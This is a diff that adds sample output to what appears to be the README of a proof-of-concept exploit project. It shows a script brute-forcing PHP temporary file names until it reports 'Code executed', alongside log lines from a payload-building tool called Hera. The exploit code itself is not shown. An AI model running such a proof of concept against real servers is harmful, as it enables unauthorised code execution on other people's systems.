@@ -38,3 +38,37 @@ bash hera.sh
 ```
 time python3 LocalExecPoC.py
 ```
+
+
+## Sample output
+
+###### LocalExecPoC.py
+```
+Trying: php1A1B.tmp
+Trying: php1A.tmp
+Trying: php1B.tmp
+Trying: phpAF1C.tmp
+Trying: phpAF0A.tmp
+Trying: phpAEFF.tmp
+Trying: php1.tmp
+Trying: php1A00.tmp
+Code executed
+
+real	4m48,857s
+user	0m3,935s
+sys	0m1,050s
+```
+
+###### hera.sh
+```
+~=Hera 0.8=~
+
+[+][2020-03-19 15:38:48] Building payload
+[+][2020-03-19 15:38:48] Starting threads
+timelimit: sending warning signal 15
+~=Hera 0.8=~
+
+[+][2020-03-19 15:38:58] Building payload
+[+][2020-03-19 15:38:58] Starting threads
+timelimit: sending warning signal 15
+```
